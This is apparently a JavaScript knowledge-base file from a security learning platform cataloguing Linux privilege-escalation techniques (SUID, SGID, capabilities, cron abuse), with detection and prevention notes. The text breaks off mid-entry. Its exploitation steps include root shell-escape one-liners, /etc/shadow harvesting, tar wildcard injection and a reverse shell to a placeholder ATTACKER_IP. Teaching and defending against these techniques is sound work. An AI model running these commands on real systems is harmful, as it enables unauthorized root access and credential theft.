// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
//
// ============================================================================
// Privilege Escalation Knowledge Base -- Linux and Windows
// darknode.ai -- Cybersecurity Learning Platform
// ============================================================================
//
// DISCLAIMER: This reference material is provided strictly for educational
// purposes and for use during AUTHORIZED penetration testing and security
// research engagements. Every technique, command, exploitation step, and
// tool described in this file must only be executed against systems you own
// or for which you have obtained explicit, documented, written authorization
// (a signed scope of work, rules of engagement, and/or a penetration testing
// agreement) from the system owner. Unauthorized access to computer systems
// is illegal under laws including but not limited to the U.S. Computer Fraud
// and Abuse Act (CFAA), the UK Computer Misuse Act, the EU Directive on
// Attacks Against Information Systems, and equivalent statutes in other
// jurisdictions. SpartanKing18 and darknode.ai assume no liability for
// misuse of this material. Always operate within an agreed scope, maintain a
// chain of custody for evidence, avoid destructive actions against
// production systems unless explicitly authorized, and follow responsible
// or coordinated disclosure when reporting vulnerabilities discovered
// outside of a contracted engagement.
//
// This file catalogs local privilege escalation (LPE) techniques for Linux
// and Windows operating systems, comprehensive enumeration command
// references for both platforms, a directory of privesc tooling, and a
// GTFOBins-style reference of Unix binaries that can be abused to bypass
// local security restrictions when they carry SUID/SGID bits, sudo rights,
// or specific Linux capabilities.
// ============================================================================

// ============================================================================
// LINUX PRIVILEGE ESCALATION TECHNIQUES
// ============================================================================

const LINUX_PRIVESC = [
  {
    id: 'linux-suid-standard-binaries',
    name: 'SUID Bit Abuse on Standard System Binaries',
    category: 'SUID/SGID Exploitation',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'The SUID (Set owner User ID) permission bit causes a binary to execute ' +
      'with the privileges of the file owner rather than the privileges of ' +
      'the user who launched it. When root owns a SUID binary, any user who ' +
      'can execute that binary temporarily runs it as root for the duration ' +
      'of that process. Many legitimate Unix utilities such as passwd, ' +
      'ping, and mount ship with the SUID bit set by design because they ' +
      'need root privileges momentarily to perform a privileged operation ' +
      '(for example, writing to /etc/shadow) on behalf of an unprivileged ' +
      'caller.\n\n' +
      'The GTFOBins project catalogs dozens of standard binaries -- find, ' +
      'nmap (legacy interactive mode), vim, less, awk, python, perl, cp, ' +
      'and many others -- that were never intended to be security ' +
      'boundaries but which expose a shell escape, arbitrary file read, or ' +
      'arbitrary file write function when invoked in a particular way. If ' +
      'any of these binaries is present with the SUID bit set and owned by ' +
      'root, a low-privileged local user can abuse the binary\'s built-in ' +
      'shell-out, plugin execution, or file-editing feature to obtain a ' +
      'root-owned process.\n\n' +
      'This is one of the single most common misconfigurations found during ' +
      'CTFs and real-world Linux penetration tests. It typically results ' +
      'from an administrator running "chmod u+s" on a binary to work around ' +
      'a permissions problem, from a package that sets the bit by default ' +
      'for legitimate reasons (nmap, in some old distro packages), or from ' +
      'a misguided attempt to let a specific user run one command as root ' +
      'without configuring sudo properly.',
    enumeration_commands: [
      {
        command: 'find / -perm -u=s -type f 2>/dev/null',
        description: 'Recursively search the filesystem for regular files that have the SUID bit set, discarding permission-denied errors.',
        what_to_look_for: 'Any binary outside the standard GTFOBins-safe baseline (passwd, su, sudo, mount, umount, ping, gpasswd, chsh, chfn, newgrp) -- especially find, python, perl, vim, less, nmap, cp, tar, or unfamiliar custom binaries in /opt, /usr/local/bin, or a home directory.'
      },
      {
        command: 'find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \\;',
        description: 'Same search using the numeric octal mode 4000 (the SUID bit), then list owner and permission details for every match.',
        what_to_look_for: 'Files owned by root with rwsr-xr-x style permissions where the "s" replaces the owner execute bit.'
      },
      {
        command: 'find / -type f -perm -4000 2>/dev/null | xargs ls -la 2>/dev/null',
        description: 'Alternate one-liner combining find and ls to quickly review ownership and mode of all SUID binaries in a single pass.',
        what_to_look_for: 'Non-standard paths such as /home/*/tool or /tmp/backup that carry the SUID bit -- these are almost always intentionally planted for a CTF or represent a serious misconfiguration in a real environment.'
      },
      {
        command: 'ls -la /usr/bin /usr/sbin /bin /sbin 2>/dev/null | grep rws',
        description: 'Grep the common binary directories for the literal "rws" permission string, which is a faster visual shortcut than a full filesystem find.',
        what_to_look_for: 'Confirm which binaries in the default PATH already carry SUID so you know what is available without needing a slow full-disk search.'
      },
      {
        command: 'https://gtfobins.github.io/#+suid  (cross-reference each found binary)',
        description: 'Cross-reference every SUID binary discovered against the GTFOBins database to identify a documented SUID exploitation technique.',
        what_to_look_for: 'A green "SUID" tag on the binary\'s GTFOBins page confirming a known technique exists.'
      }
    ],
    exploitation_steps: [
      'Enumerate all SUID binaries with find / -perm -u=s -type f 2>/dev/null and record their absolute paths and owning user.',
      'Diff the results against a known-safe baseline list (passwd, su, sudo, mount, umount, ping, gpasswd, chsh, chfn, newgrp, pkexec on some distros) to isolate anything unusual.',
      'For every non-baseline SUID binary, look it up on gtfobins.github.io under the SUID function to see whether a documented shell escape exists.',
      'If the binary is "find", run: find . -exec /bin/sh -p \\; -quit to spawn a root shell (the -p flag on sh preserves privileges even when the effective and real UID differ).',
      'If the binary is "python" or "python3" with SUID set, run: python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\' to spawn a privileged shell.',
      'If the binary is "vim", run: vim -c \':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\' or use the simpler :!/bin/sh -p from within vim.',
      'If the binary is "less" or "more", open any file (less /etc/hosts) and then type !/bin/sh from the pager prompt to shell out with inherited privileges.',
      'If no direct shell escape exists, check whether the binary reads or writes arbitrary files (cp, tar, rsync) and use that primitive to overwrite /etc/passwd, /etc/shadow, or an SSH authorized_keys file instead.',
      'Once a shell is obtained, immediately verify effective privileges with id and confirm euid=0(root), then stabilize the shell (script /dev/null -c bash or a Python pty) for interactive use.',
      'Document the exact binary, path, and command used, and note whether the SUID bit appears intentional (a documented company tool) or a misconfiguration for the final report.'
    ],
    tools: ['GTFOBins', 'LinPEAS', 'LinEnum', 'linux-smart-enumeration (lse.sh)', 'find (built-in)', 'suid3num.py'],
    detection:
      'Defenders detect SUID abuse through file integrity monitoring (AIDE, Tripwire, OSSEC) that alerts on new SUID bits appearing outside a known baseline, ' +
      'periodic automated audits (a nightly cron job running find / -perm -4000 and diffing against a golden list), and auditd rules that log execve calls ' +
      'against SUID binaries (auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -C uid!=euid -k suid_priv_esc). ' +
      'EDR/host-based tools such as Wazuh, osquery (suid_bin table), and Falco can alert in near real time when a process runs with an effective UID that differs from its real UID.',
    prevention:
      'Remove the SUID bit from any binary that does not strictly require it (chmod u-s /path/to/binary), and never grant SUID to interpreters or file-manipulation ' +
      'utilities like python, perl, find, vim, or tar. Use sudo with a tightly scoped command allowlist and NOPASSWD only where justified instead of SUID for ' +
      'delegated administrative tasks, apply the principle of least privilege to package installations, and run automated SUID audits as part of CIS Benchmark ' +
      'compliance scanning (CIS controls explicitly flag unauthorized SUID/SGID files).',
    real_world_examples: [
      { reference: 'GTFOBins nmap legacy --interactive mode', description: 'Older nmap packages on some distributions historically shipped with an interactive mode invoked via nmap --interactive, which exposed a !sh shell-out; combined with a SUID bit this was a trivial root escalation and led most distributions to strip interactive mode entirely.' },
      { reference: 'HackTheBox / TryHackMe CTF pattern', description: 'A large fraction of beginner Linux privesc challenges on HackTheBox and TryHackMe intentionally plant a SUID bit on find, python, or a custom compiled binary to teach exactly this technique, reflecting how common it is in real misconfigured environments.' },
      { reference: 'Real-world misconfiguration case', description: 'Administrators who run "chmod +s /usr/bin/php" or similar to work around a cron permission issue inadvertently hand every local user a path to root; this pattern is regularly reported in penetration test findings under CWE-269 (Improper Privilege Management).' }
    ]
  },
  {
    id: 'linux-suid-custom-binaries',
    name: 'Custom/Compiled SUID Binary Exploitation via Function Hooking and Injection',
    category: 'SUID/SGID Exploitation',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'Beyond well-known GTFOBins entries, many organizations deploy custom, ' +
      'in-house compiled SUID binaries to let ordinary users perform a ' +
      'specific privileged action -- restarting a service, backing up a ' +
      'directory, resetting a device -- without granting full root access. ' +
      'Because these binaries are bespoke, they were never security-reviewed ' +
      'to the level of coreutils, and they frequently contain classic C ' +
      'vulnerability classes: calling system() or popen() with an ' +
      'attacker-influenced string, using relative paths to invoke helper ' +
      'binaries without an absolute path (letting PATH manipulation ' +
      'redirect execution), linking against a shared library that can be ' +
      'hijacked, or reading configuration/environment values without ' +
      'sanitizing them.\n\n' +
      'Static and dynamic analysis of the binary (strings, ltrace, strace, ' +
      'objdump, Ghidra) usually reveals the vulnerable call quickly. Because ' +
      'the binary runs as root, any injected command, hijacked library, or ' +
      'overwritten config value executes with root privileges, delivering ' +
      'immediate privilege escalation.\n\n' +
      'A related but distinct primitive is function hooking via LD_PRELOAD ' +
      'or LD_AUDIT: if the SUID binary is not compiled with the ' +
      'setuid-safe flags and the environment is not fully sanitized before ' +
      'exec, an attacker-controlled shared object can be loaded into the ' +
      'process and can call setuid(0); execve("/bin/sh", ...) from within ' +
      'a hooked libc function such as printf or strcpy.',
    enumeration_commands: [
      {
        command: 'find / -perm -u=s -type f 2>/dev/null | xargs -I{} file {}',
        description: 'Identify SUID files and confirm which are ELF binaries versus scripts, since compiled custom tools show up as ELF 64-bit LSB executable.',
        what_to_look_for: 'Any ELF binary in a non-package-manager path (/opt/company-tool, /home/*/bin, /usr/local/sbin) that is not tracked by dpkg -S or rpm -qf.'
      },
      {
        command: 'dpkg -S /path/to/suid-binary  OR  rpm -qf /path/to/suid-binary',
        description: 'Check whether the binary is owned by an installed package; an "no path found" response indicates a custom, unmanaged binary worth deeper analysis.',
        what_to_look_for: 'Package manager reporting no owning package, strongly suggesting a bespoke internal tool.'
      },
      {
        command: 'strings -a /path/to/suid-binary | grep -Ei "system|popen|exec|/bin/|/usr/bin"',
        description: 'Search the binary\'s string table for calls that shell out to external commands or reference other executables.',
        what_to_look_for: 'A relative command name like "backup.sh" or "service" rather than an absolute path like "/usr/sbin/service", which indicates PATH hijacking is possible.'
      },
      {
        command: 'ltrace -f -S ./suid-binary 2>&1 | head -100',
        description: 'Trace library and system calls made by the binary during execution to observe exactly which functions and arguments are used at runtime.',
        what_to_look_for: 'Calls to system(), popen(), execve(), or setuid()/seteuid() and the literal argument strings passed to them.'
      },
      {
        command: 'ldd /path/to/suid-binary',
        description: 'List the shared libraries the binary is dynamically linked against.',
        what_to_look_for: 'A library resolved from a world-writable directory, or "not found" entries indicating a missing library that could be planted (shared library hijacking).'
      },
      {
        command: 'objdump -d /path/to/suid-binary | less    OR    Ghidra / IDA for full disassembly',
        description: 'Disassemble the binary to statically confirm the vulnerable code path when dynamic tracing is inconclusive or the tool refuses certain inputs.',
        what_to_look_for: 'Direct calls to system@plt or popen@plt with a format string built from argv, getenv(), or a config file value.'
      }
    ],
    exploitation_steps: [
      'Locate the custom SUID binary and confirm it is unmanaged by the package manager, indicating internal, less-reviewed code.',
      'Run strings and ltrace/strace against the binary to identify any external command execution, relative-path invocation, or environment variable usage.',
      'If a relative command name is invoked (e.g. the binary calls "service") create a malicious script named "service" in a writable directory, chmod +x it, and prepend that directory to PATH before running the SUID binary.',
      'If system()/popen() is called with a format string incorporating user input (a filename argument, an environment variable), attempt command injection via shell metacharacters (; | && $() backticks) in that input.',
      'If the binary links against a missing or world-writable shared library (revealed by ldd), write a malicious .so exposing the required symbols, place it on the resolved search path, and let the binary load it -- the constructor function can call setuid(0) and spawn a shell.',
      'If the binary reads a configuration file from a world-writable location, modify that file to inject a malicious command or path that will be invoked with root privileges.',
      'If none of the above apply, check for classic memory-corruption bugs (buffer overflow, format string) using fuzzing (AFL++) or manual analysis if the binary handles complex input.',
      'After achieving code execution as root, spawn an interactive shell: /bin/sh -p (the -p flag prevents the shell from dropping privileges when real and effective UID differ), or use setuid(0); setgid(0); system("/bin/bash") payloads inside injected code.',
      'Verify with id that euid=0, then stabilize the shell and document the exact vulnerability class (CWE-78 command injection, CWE-427 uncontrolled search path, etc.) for the report.'
    ],
    tools: ['ltrace', 'strace', 'gdb', 'Ghidra', 'objdump', 'checksec', 'pwntools', 'strings'],
    detection:
      'File integrity monitoring flags newly deployed unmanaged SUID binaries, and auditd can log every execve of a SUID program along with its arguments and ' +
      'child processes (auditctl -a always,exit -S execve -F euid=0 -k suid_exec). Endpoint monitoring that alerts on a SUID process spawning /bin/sh, /bin/bash, ' +
      'or an unexpected child process is highly effective since legitimate custom SUID tools rarely fork a shell.',
    prevention:
      'Subject all in-house SUID tooling to secure code review before deployment: never call system()/popen() with attacker-influenced input, always invoke ' +
      'helper binaries with a hardcoded absolute path, explicitly sanitize or clear the environment (clearenv() or a strict allowlist) at process start, ' +
      'link statically or verify library paths are not world-writable, and prefer a narrowly scoped sudoers entry over a custom SUID binary wherever possible ' +
      'because sudo provides centralized logging and easier auditing.',
    real_world_examples: [
      { reference: 'CWE-78 Command Injection in custom SUID wrappers', description: 'A recurring finding class in internal penetration tests: bespoke "helper" SUID tools written to let developers restart a service or clear a log directory call system() with a partially attacker-controlled string, allowing trivial root shells via shell metacharacter injection.' },
      { reference: 'CWE-427 Uncontrolled Search Path Element', description: 'Custom binaries that shell out to a bare command name like "tar" or "gzip" instead of /bin/tar are vulnerable to PATH hijacking; this exact class is documented extensively in OffSec\'s PEN-200 / PWK coursework as a foundational Linux privesc exercise.' },
      { reference: 'Shared library hijack via missing .so', description: 'Binaries compiled during development referencing a debug-only shared library that is absent in production (revealed by ldd showing "not found") allow an attacker to drop a malicious library on any writable path in the linker search order and gain code execution as root.' }
    ]
  },
  {
    id: 'linux-sgid-binary-exploitation',
    name: 'SGID Bit Abuse on Group-Owned Binaries',
    category: 'SUID/SGID Exploitation',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'The SGID (Set Group ID) bit is the group-level counterpart to SUID: when set on an executable, the process runs with the effective group ' +
      'ID of the file\'s owning group rather than the caller\'s primary group. SGID is less immediately dangerous than SUID because it grants group ' +
      'privileges instead of full root, but it is frequently overlooked during hardening reviews precisely because assessors focus on SUID. When an ' +
      'SGID binary is owned by a privileged group such as shadow, disk, adm, or docker, execution can grant access equivalent to, or a direct stepping ' +
      'stone toward, root.\n\n' +
      'A classic example is any SGID binary owned by the shadow group: the shadow group historically has read access to /etc/shadow on many ' +
      'distributions, so an SGID binary such as a misconfigured "less" or a custom log viewer that is group-owned by shadow can be abused to read the ' +
      'shadow file directly, or to shell out with the shadow group in the resulting process\'s supplementary group list, enabling a subsequent offline ' +
      'hash crack.\n\n' +
      'GTFOBins also documents SGID-specific techniques (a separate function column from SUID) for binaries like tar, zip, and expect, since spawning a ' +
      'shell from an SGID binary inherits the elevated group rather than an elevated user.',
    enumeration_commands: [
      { command: 'find / -perm -g=s -type f 2>/dev/null', description: 'Search the filesystem for regular files with the SGID bit set.', what_to_look_for: 'Binaries owned by shadow, disk, adm, docker, or any group with more than default read/write reach.' },
      { command: 'find / -perm -2000 -type f 2>/dev/null -exec ls -la {} \\;', description: 'Numeric octal equivalent search (2000 = SGID) with a detailed listing appended.', what_to_look_for: 'Group column showing a privileged group name rather than the executing user\'s primary group.' },
      { command: 'cat /etc/group | grep -E "shadow|disk|adm|docker|video|lxd"', description: 'Enumerate membership and existence of privileged groups to understand what an SGID binary owned by that group would actually grant.', what_to_look_for: 'Confirm which sensitive groups exist on the target and what resources they can access (e.g. shadow group historically has 0640 read on /etc/shadow).' },
      { command: 'ls -la /etc/shadow', description: 'Check the group ownership and permission bits of the shadow file itself.', what_to_look_for: '-rw-r----- 1 root shadow indicates any process running with the shadow group in its supplementary groups can read password hashes.' }
    ],
    exploitation_steps: [
      'Run find / -perm -g=s -type f 2>/dev/null to enumerate every SGID binary on the filesystem.',
      'Cross-reference each SGID binary against GTFOBins under the SGID function column to find a documented shell-spawn or file-read technique.',
      'Identify the owning group of each SGID binary with ls -la and prioritize any owned by shadow, disk, adm, or docker.',
      'If a shell-spawning SGID binary is owned by the shadow group (for example an SGID copy of less or a custom log tool), execute its shell-out technique to obtain a shell running with the shadow group in its supplementary group list.',
      'From that shell, directly read /etc/shadow (cat /etc/shadow) to harvest password hashes for offline cracking with hashcat or John the Ripper.',
      'If the SGID binary is owned by disk instead, pivot to the disk-group raw-device-read technique to read the root filesystem block device directly.',
      'Combine any cracked or extracted credentials with further enumeration (sudo -l, SSH key reuse) to complete escalation to a full root shell.'
    ],
    tools: ['GTFOBins', 'LinPEAS', 'LinEnum', 'hashcat', 'John the Ripper'],
    detection:
      'The same file-integrity and auditd approaches used for SUID monitoring apply to SGID: alert on new group-execute-with-setgid bits appearing outside a ' +
      'known baseline, and specifically alert when a process\'s supplementary group list includes shadow, disk, or docker but the parent binary is not an ' +
      'expected system utility.',
    prevention:
      'Audit and remove unnecessary SGID bits (chmod g-s), avoid placing general-purpose interpreters or pagers in privileged groups, and restrict the shadow ' +
      'group\'s read access to /etc/shadow to only the specific service accounts that require it rather than leaving it broadly assigned.',
    real_world_examples: [
      { reference: 'GTFOBins SGID function entries', description: 'GTFOBins maintains a dedicated SGID column separate from SUID for binaries such as tar, zip, expect, and cpio, reflecting how common group-privilege escalation via SGID is in real assessments.' },
      { reference: 'shadow-group SGID misconfiguration pattern', description: 'Custom internal log-viewing or diagnostic tools that are made SGID shadow so support staff can read authentication logs frequently also grant unintended read access to /etc/shadow itself, a pattern repeatedly documented in OSCP-style lab writeups.' }
    ]
  },
  {
    id: 'linux-capabilities-abuse',
    name: 'Linux Capabilities Abuse (cap_setuid, cap_dac_override, cap_sys_admin, cap_net_raw, and related)',
    category: 'Linux Capabilities',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'Linux capabilities split the monolithic root privilege into roughly forty discrete units (defined in capabilities(7)) that can be attached ' +
      'individually to a binary via the file capability extended attribute, letting a process gain a narrow slice of root power without carrying the full ' +
      'SUID bit. While this is intended as a security improvement over blanket SUID, several individual capabilities are equivalent to full root when held ' +
      'by an attacker-controlled process, making misconfigured capabilities just as dangerous as SUID misconfigurations, and far less commonly audited.\n\n' +
      'cap_setuid lets a process call setuid()/setresuid() to change to any UID including 0, so any interpreter (python3, perl) granted cap_setuid+ep can ' +
      'trivially spawn a root shell. cap_dac_override bypasses all discretionary access control (file permission) checks, letting the process read or write ' +
      'any file on the system regardless of its mode bits -- including /etc/shadow and /etc/passwd. cap_dac_read_search similarly bypasses read/directory- ' +
      'traversal checks. cap_sys_admin is an extremely broad, catch-all capability that historically has been described as "the new root" because it permits ' +
      'mount operations, namespace manipulation, and numerous other privileged syscalls that can be chained into a full container or host escape. cap_sys_ptrace ' +
      'permits ptrace-based process injection into any process, including root-owned ones, enabling code injection to steal privileges. cap_net_raw allows ' +
      'crafting raw and packet sockets, which is more useful for sniffing/spoofing than direct privesc but can assist credential capture. cap_sys_module ' +
      'permits loading arbitrary kernel modules, which is an immediate and total root/kernel compromise.\n\n' +
      'Capabilities are commonly set on interpreters and utilities to support a specific use case (e.g. giving tcpdump cap_net_raw+eip instead of full SUID) ' +
      'but administrators sometimes over-grant capabilities like cap_setuid or cap_sys_admin to Python, Perl, Node, or custom binaries to solve a permissions ' +
      'problem quickly, creating a direct privesc path.',
    enumeration_commands: [
      { command: 'getcap -r / 2>/dev/null', description: 'Recursively scan the filesystem for any file carrying extended-attribute capabilities.', what_to_look_for: 'python3, perl, node, php, or any custom binary showing cap_setuid, cap_dac_override, cap_sys_admin, cap_sys_ptrace, or cap_sys_module in the +ep (effective, permitted) set.' },
      { command: 'cat /proc/self/status | grep Cap', description: 'View the capability bitmasks (CapInh, CapPrm, CapEff, CapBnd, CapAmb) of the current shell process to understand baseline capability state.', what_to_look_for: 'Any non-zero effective capability set beyond the default unprivileged baseline.' },
      { command: 'capsh --decode=0000000000003000', description: 'Decode a raw capability bitmask hex value (as seen in /proc/[pid]/status) into human-readable capability names.', what_to_look_for: 'Translation of the CapEff/CapPrm hex values into named capabilities like cap_setuid, cap_net_bind_service, etc.' },
      { command: 'getcap -r / 2>/dev/null | grep -Ei "cap_setuid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace|cap_sys_module|cap_chown"', description: 'Filter the full capability scan for the specific high-impact capabilities that most directly translate into full privilege escalation.', what_to_look_for: 'Any hit on this filtered list against an interpreter or writable custom binary.' }
    ],
    exploitation_steps: [
      'Run getcap -r / 2>/dev/null to enumerate every file on disk carrying extended-attribute capabilities and note the exact capability set (e.g. cap_setuid+ep).',
      'If python3 (or python, perl, ruby, node, php) has cap_setuid+ep, run: /path/to/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\' to spawn a root shell.',
      'If a binary has cap_dac_override+ep or cap_dac_read_search+ep, use it (via any file read/write function it exposes, or a paired interpreter) to directly read /etc/shadow or write a new root entry into /etc/passwd, bypassing normal file permission checks entirely.',
      'If a binary has cap_sys_admin+ep, investigate container/namespace escape paths: this capability can permit mounting the host cgroup filesystem inside a container and abusing the release_agent file to execute a command on the host as root, a well-documented container-breakout technique.',
      'If a binary has cap_sys_ptrace+ep, use a tool such as GDB or a custom ptrace-based injector to attach to a root-owned process and inject shellcode that spawns a shell, inheriting that process\'s privileges.',
      'If a binary has cap_sys_module+ep, compile and load a malicious kernel module (insmod) that modifies its own or the calling process\'s credentials to uid 0, granting full kernel-level compromise.',
      'After escalation, confirm privileges with id and capsh --print, then stabilize the shell and record the exact capability, binary path, and technique used for the assessment report.'
    ],
    tools: ['getcap', 'capsh', 'LinPEAS', 'GTFOBins (capabilities column)', 'python3', 'gdb'],
    detection:
      'Because capabilities live as extended file attributes, standard file-permission monitoring misses them; defenders must specifically run periodic ' +
      'getcap -r / scans (or use LinPEAS/osquery equivalents) and diff results against an approved baseline. auditd can also be configured to alert on ' +
      'capset/capget syscalls and on processes whose CapEff in /proc/[pid]/status contains high-impact bits unexpectedly.',
    prevention:
      'Grant the single narrowest capability that solves the actual requirement (e.g. cap_net_bind_service instead of full SUID for a web server binding ' +
      'port 80) and never assign cap_setuid, cap_dac_override, cap_sys_admin, or cap_sys_module to a general-purpose interpreter. Use setcap -r to remove ' +
      'capabilities that are no longer required, and treat file capabilities with the same change-control rigor as SUID bits during hardening reviews and ' +
      'CIS Benchmark audits.',
    real_world_examples: [
      { reference: 'Container escape via cap_sys_admin + release_agent', description: 'A widely documented Docker/LXC breakout technique abuses cap_sys_admin to mount the host cgroup v1 controller inside a container and write to the release_agent file, achieving arbitrary command execution on the host as root -- this is a staple technique in container security research and CTF "container escape" categories.' },
      { reference: 'python3 cap_setuid privesc (common CTF/lab finding)', description: 'Granting cap_setuid+ep to a system Python interpreter (often done accidentally while trying to let a script bind a privileged port) is one of the most frequently reported capability misconfigurations in HackTheBox and OSCP-style Linux privilege escalation exercises.' }
    ]
  },
  {
    id: 'linux-cron-writable-script',
    name: 'Cron Job Exploitation via Writable Script Referenced by a Privileged Crontab Entry',
    category: 'Scheduled Task Abuse',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'System crontabs (/etc/crontab, /etc/cron.d/*, and the per-directory cron.hourly/daily/weekly/monthly jobs) are almost always executed as root. ' +
      'If any script referenced by one of these privileged cron entries is writable by a lower-privileged user or group -- due to an overly permissive ' +
      'mode, a misconfigured group ownership, or the script residing in a world-writable directory such as /tmp -- that user can simply edit the script ' +
      'to insert an arbitrary command. The next time cron fires the job (which may be every minute, hourly, or on a specific schedule), the injected ' +
      'command executes with root privileges.\n\n' +
      'This is one of the highest-value Linux privesc primitives because it requires no exploit development at all: it is a pure file-permission ' +
      'misconfiguration, and the resulting root shell (typically achieved by appending a reverse shell one-liner or a SUID-granting chmod command to the ' +
      'script) is fully reliable and repeatable. It is extremely common in real environments where deployment scripts, backup scripts, or log rotation ' +
      'helpers are dropped into a shared or group-writable directory for convenience during development and never re-permissioned.',
    enumeration_commands: [
      { command: 'cat /etc/crontab', description: 'Read the system-wide crontab, which lists the user each job runs as alongside the schedule and command.', what_to_look_for: 'Any entry that runs as root and references a script path outside /etc/cron.*, especially one in /opt, /home, /tmp, or /var/www.' },
      { command: 'ls -la /etc/cron.d/ && cat /etc/cron.d/*', description: 'Enumerate and read every drop-in cron file, which frequently hold application-specific scheduled jobs installed by packages or admins.', what_to_look_for: 'Referenced scripts with permissive modes, or scripts owned by a non-root user despite running as root via cron.' },
      { command: 'ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly', description: 'List the periodic job directories and inspect ownership/permissions of every script inside them (all run as root by run-parts).', what_to_look_for: 'Any script that is group- or world-writable, or owned by a non-root user.' },
      { command: 'find / -writable -type f 2>/dev/null | grep -iE "cron|\\.sh$|backup|maintenance"', description: 'Search the whole filesystem for writable files whose name suggests they might be invoked by a scheduled task.', what_to_look_for: 'Writable shell scripts outside your own home directory, particularly under /opt, /srv, or /usr/local.' },
      { command: 'pspy64 (run and observe for 60+ seconds)', description: 'Use pspy, a process snooper that requires no privileges, to directly observe cron and other scheduled processes as they actually execute in real time, since crontabs are not always fully visible to an unprivileged user.', what_to_look_for: 'Any root-owned process launching a script from a writable path on a recurring interval.' }
    ],
    exploitation_steps: [
      'Enumerate visible crontabs (/etc/crontab, /etc/cron.d/*, per-user crontabs if readable) and run pspy to catch any hidden or undocumented scheduled jobs.',
      'For every job that runs as root, resolve the exact script or command path it invokes.',
      'Check the write permissions on that script with ls -la; if your current user or a group you belong to has write access, proceed.',
      'Append a malicious payload to the script, such as: echo \'chmod u+s /bin/bash\' >> /path/to/script.sh, or a full reverse shell one-liner: echo \'bash -i >/dev/tcp/ATTACKER_IP/4444 0>&1\' >> /path/to/script.sh.',
      'Set up a listener (nc -lvnp 4444) before the scheduled time if using a reverse shell payload, or simply wait if using the SUID-bash technique.',
      'Wait for the cron schedule to trigger (check the crontab entry for exact timing; many CTF/lab boxes use a 1-2 minute interval for teaching purposes).',
      'Once triggered, either catch the incoming reverse shell connection, or run /bin/bash -p if you used the chmod u+s technique to get a root-privileged shell.',
      'Clean up the injected line from the script after successful escalation if operating under an authorized engagement\'s rules of engagement that require minimizing footprint.'
    ],
    tools: ['pspy', 'LinPEAS', 'crontab -l', 'netcat'],
    detection:
      'Auditd file-write monitoring on cron directories and referenced script paths (auditctl -w /etc/cron.d -p wa -k cron_tamper) catches modification ' +
      'attempts immediately. Centralized logging of cron execution (via rsyslog CRON facility) combined with process-creation monitoring (auditd execve ' +
      'logging or an EDR agent) reveals unexpected child processes spawned by cron, such as a shell or netcat.',
    prevention:
      'Ensure every script referenced by a privileged cron job is owned by root, mode 700 or 750 with no group/world write, and stored outside world- ' +
      'writable directories such as /tmp or /var/tmp. Apply the same review rigor to cron scripts as to SUID binaries, and use file integrity monitoring ' +
      'to alert on any modification to files referenced by root crontabs.',
    real_world_examples: [
      { reference: 'CWE-732 Incorrect Permission Assignment for Critical Resource', description: 'This exact misconfiguration class -- a root cron job invoking a group- or world-writable script -- is one of the most frequently cited findings in Linux privilege escalation sections of professional penetration test reports.' },
      { reference: 'OSCP / PWK teaching lab pattern', description: 'Offensive Security\'s PEN-200 course and numerous HackTheBox "easy" rated Linux boxes deliberately include a writable cron script as a foundational privesc exercise, reflecting its prevalence in real assessments.' }
    ]
  },
  {
    id: 'linux-cron-wildcard-injection',
    name: 'Cron Wildcard Injection (Wildcard/Argument Injection into tar, chown, rsync via Cron)',
    category: 'Scheduled Task Abuse',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'When a root cron job runs a command using a shell glob (wildcard) inside a directory that a lower-privileged user can write to -- for example ' +
      '"cd /var/www/html && tar -czf /backup/site.tar.gz *" -- the shell expands the asterisk to every filename in that directory before tar ever runs. ' +
      'Because command-line arguments beginning with a hyphen are indistinguishable from filenames to the shell, an attacker can create files whose names ' +
      'are themselves crafted to be interpreted as options by the target command. This technique, popularized as "wildcard injection" and documented ' +
      'extensively by security researcher DefenseCode ("Abusing wildcards on Linux/Unix"), turns an apparently safe archival or permission-fixing cron job ' +
      'into an arbitrary code execution or arbitrary file write primitive.\n\n' +
      'GNU tar supports a --checkpoint-action flag that runs an arbitrary command at each checkpoint; by naming two files "--checkpoint=1" and ' +
      '"--checkpoint-action=exec=sh shell.sh" inside the writable directory, the wildcard expansion causes tar to interpret them as flags rather than ' +
      'filenames, executing shell.sh with the privileges of the cron job (root). The equivalent trick against chown uses "--reference=/path/to/file/owned/by/attacker" ' +
      'to make chown copy ownership from an attacker-controlled reference file onto a target, and rsync supports "-e" injection to specify an arbitrary ' +
      'remote shell command.',
    enumeration_commands: [
      { command: 'cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -E "tar|chown|rsync|cp -r"', description: 'Search all visible crontabs for jobs invoking tar, chown, rsync, or cp with a wildcard in a directory path.', what_to_look_for: 'Commands using a bare asterisk (*) as an argument, especially "cd /some/writable/dir && tar czf ... *" patterns.' },
      { command: 'ls -la /var/www/html /var/backups /opt/*/data 2>/dev/null', description: 'Check write permissions on directories that are commonly targeted by backup/archival cron jobs.', what_to_look_for: 'Directories writable by your user or a group you belong to, especially ones referenced by a root cron job using a wildcard.' },
      { command: 'pspy64', description: 'Passively observe scheduled command execution including the exact argv used, confirming whether a wildcard expands as expected.', what_to_look_for: 'A tar, chown, or rsync invocation with a literal * visible in the observed command line.' }
    ],
    exploitation_steps: [
      'Identify a root cron job that runs a wildcard-expanding command (tar, chown, rsync, cp, zip) inside a directory writable by your current user.',
      'For a tar-based job, create two files in that directory named exactly "--checkpoint=1" and "--checkpoint-action=exec=sh shell.sh" (using touch -- \'--checkpoint=1\').',
      'Create the payload script shell.sh in the same directory containing your malicious commands, e.g. chmod u+s /bin/bash, and make it executable.',
      'Wait for the cron job to fire; when tar expands the wildcard it will pick up the two specially-named files as flags rather than data files and execute shell.sh as root via the checkpoint-action hook.',
